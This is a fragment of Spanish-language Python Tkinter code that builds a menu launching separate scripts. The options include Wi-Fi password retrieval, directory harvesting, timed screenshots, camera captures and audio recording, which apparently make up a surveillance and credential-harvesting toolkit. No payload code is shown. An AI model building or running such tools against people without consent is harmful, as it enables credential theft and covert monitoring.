...
# Botón de Instrucciones en la pantalla de bienvenida (Ahora encima de CONTINUAR)
...
intro_label = tk.Label(menu_frame, text="¿Qué quieres hacer?", font=("Courier", 12, "bold"), fg="white", bg=bg_color)
...
scripts = [
    ("1", "Activacion de NO registro", "NOregister.pyw"),
    ("2", "Instalacion de programas", "instalables.pyw"),
    ("3", "Obtencion de claves wifi", "wifi.pyw"),
    ("4", "Recoleccion de directorios", "saberyganar.pyw"),
]
...
# Función para ejecutar el script con barra de progreso de las opciones: 4,5,6,7 y 8
def run_script_with_progress(script_name):
    start_time = time.time()
    try:
        # Iniciar el script
...
# Modificar el comportamiento de las opciones 4, 5, 6, 7
start_stop_scripts = [
    ("5", "Capturas de pantalla", "screenshot-fivesec.pyw"),
    ("6", "Fotos desde la camara", "camerashot-5sec.pyw"),
    ("7", "Grabacion de audio", "recording.pyw"),
